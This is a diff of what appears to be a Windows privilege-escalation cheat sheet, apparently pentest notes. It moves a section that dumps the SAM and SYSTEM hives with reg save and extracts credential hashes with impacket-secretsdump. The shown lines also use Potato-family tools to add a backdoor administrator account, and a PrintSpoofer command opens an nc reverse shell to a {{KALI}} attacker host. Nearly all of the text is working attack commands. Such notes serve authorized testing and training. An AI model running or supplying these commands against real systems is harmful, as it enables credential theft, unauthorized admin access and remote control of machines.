@@ -1,7 +1,12 @@
 # === TOKEN PRIVILEGES (CHECK FIRST) ===
 whoami /priv
-# SeImpersonate or SeAssignPrimaryToken = Potato family immediately
-# GodPotato - works on Server 2019 / Win10+ (check OS first)
+# SeBackupPrivilege = SAM/SYSTEM dump
+#!cmd reg save hklm\sam C:\temp\SAM
+#!cmd reg save hklm\system C:\temp\SYSTEM
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+
+# >>> SeImpersonate / SeAssignPrimaryToken -> Potato Family
+# GodPotato - Server 2019 / Win10+
 #!cmd .\GodPotato.exe -cmd "cmd /c whoami"
 #!cmd .\GodPotato.exe -cmd "cmd /c net user hacker P@ss123 /add && net localgroup administrators hacker /add"
 # PrintSpoofer - alternative for SeImpersonate
@@ -9,11 +14,7 @@ whoami /priv
 #!cmd .\PrintSpoofer.exe -c "C:\temp\nc.exe {{KALI}} {{KALI_REV_PORT}} -e cmd"
 # JuicyPotatoNG - Server 2016/2019
 #!cmd .\JuicyPotatoNG.exe -t * -p "cmd.exe" -a "/c net user hacker P@ss123 /add"
-# SeBackupPrivilege = SAM/SYSTEM dump
-#!cmd reg save hklm\sam C:\temp\SAM
-#!cmd reg save hklm\system C:\temp\SYSTEM
-# Parse on Kali
-impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+# <<<
 
 # === SERVICE ATTACKS ===
 # 1. Unquoted service path
